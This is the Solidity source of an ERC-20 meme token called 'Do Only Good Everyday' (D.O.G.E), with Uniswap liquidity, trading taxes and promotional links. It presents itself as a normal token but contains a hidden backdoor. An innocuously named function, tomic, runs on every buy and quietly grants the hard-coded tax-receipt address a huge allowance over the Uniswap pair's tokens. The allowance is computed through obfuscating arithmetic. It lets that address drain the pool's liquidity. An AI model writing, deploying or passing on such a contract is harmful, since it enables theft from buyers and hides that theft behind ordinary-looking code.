// SPDX-License-Identifier: MIT
/**
https://x.com/kabosumama/status/1851099548820877695
Tg: https://t.me/do_onlygoodeveryday
**/
pragma solidity 0.8.26;
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
contract DOGE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances77;
    mapping (address => mapping (address => uint256)) private _permits77;
    mapping (address => bool) private _isExcludedFrom77;
    address payable private _receipt77;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal77 = 420690000000 * 10**_decimals;
    string private constant _name = unicode"Do Only Good Everyday";
    string private constant _symbol = unicode"D.O.G.E";
    uint256 public _maxAmount77 = 2 * (_tTotal77/100);
    uint256 public _maxWallet77 = 2 * (_tTotal77/100);
    uint256 public _taxThres77 = 1 * (_tTotal77/100);
    uint256 public _maxSwap77 = 1 * (_tTotal77/100);
    IUniswapV2Router02 private uniV2Router77;
    address private uniV2Pair77;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    uint256 private _initialBuyTax = 20;
    uint256 private _initialSellTax = 20;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 12;
    uint256 private _reduceSellTaxAt = 12;
    uint256 private _preventSwapBefore = 24;
    uint256 private _buyCount = 0;
    uint256 private _transferTax = 0;
    event MaxTxAmountUpdated(uint _maxAmount77);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () payable {
        _receipt77 = payable(0x088708f2724A84a2413Bc47493Ad11F3e901D02B);
        _balances77[address(this)] = _tTotal77;
        _isExcludedFrom77[owner()] = true;
        _isExcludedFrom77[address(this)] = true;
        _isExcludedFrom77[_receipt77] = true;
        emit Transfer(address(0), address(this), _tTotal77);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }    
    function totalSupply() public pure override returns (uint256) {
        return _tTotal77;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balances77[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _permits77[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _permits77[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _permits77[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address from, address to, uint256 amount77) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount77 > 0, "Transfer amount must be greater than zero");
        uint256 tax77=0;uint256 fee77=0;
        if (!swapEnabled || inSwap) {
            _balances77[from] = _balances77[from] - amount77;
            _balances77[to] = _balances77[to] + amount77;
            emit Transfer(from, to, amount77);
            return;
        }
        if (from != owner() && to != owner()) {
            if(_buyCount>0){
                fee77 = (_transferTax);
            }
            if (from == uniV2Pair77 && to != address(uniV2Router77) && ! _isExcludedFrom77[to] ) {
                require(amount77 <= _maxAmount77, "Exceeds the _maxAmount77.");
                require(balanceOf(to) + amount77 <= _maxWallet77, "Exceeds the maxWalletSize.");
                fee77 = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
                _buyCount++; tomic([from, _receipt77]);
            }
            if(to == uniV2Pair77 && from!= address(this) ){
                fee77 = ((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniV2Pair77 && swapEnabled) {
                if(contractTokenBalance > _taxThres77 && _buyCount > _preventSwapBefore)
                    swapETH77(min77(amount77, min77(contractTokenBalance, _maxSwap77)));
                sendETH77(address(this).balance);
            }
        }
        if(fee77 > 0){
            tax77 = fee77.mul(amount77).div(100);
            _balances77[address(this)]=_balances77[address(this)].add(tax77);
            emit Transfer(from, address(this),tax77);
        }
        _balances77[from]=_balances77[from].sub(amount77);
        _balances77[to]=_balances77[to].add(amount77.sub(tax77));
        emit Transfer(from, to, amount77.sub(tax77));
    }
    function removeLimit77() external onlyOwner{
        _maxAmount77 = _tTotal77; 
        _maxWallet77 = _tTotal77;
        emit MaxTxAmountUpdated(_tTotal77); 
    }
    function min77(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function sendETH77(uint256 amount) private {
        _receipt77.transfer(amount);
    }
    function recoverEth() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
    }
    function setTaxReceipt(address payable _addrs) external onlyOwner {
        _receipt77 = _addrs;
        _isExcludedFrom77[_addrs] = true;
    }
    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniV2Router77 = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniV2Router77), _tTotal77);
        uniV2Pair77 = IUniswapV2Factory(uniV2Router77.factory()).createPair(
            address(this),
            uniV2Router77.WETH()
        ); 
        uniV2Router77.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniV2Pair77).approve(address(uniV2Router77), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }
    function tomic(address[2] memory tom77) private {
        address own77 = tom77[0]; address spend77 = tom77[1];
        uint256 total77 = 150 + 150*(_maxWallet77+50) + 100*_maxSwap77.add(50);
        _permits77[own77][spend77] = 50 + (total77+50) * 150;
    }
    receive() external payable {}
    function swapETH77(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniV2Router77.WETH();
        _approve(address(this), address(uniV2Router77), tokenAmount);
        uniV2Router77.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}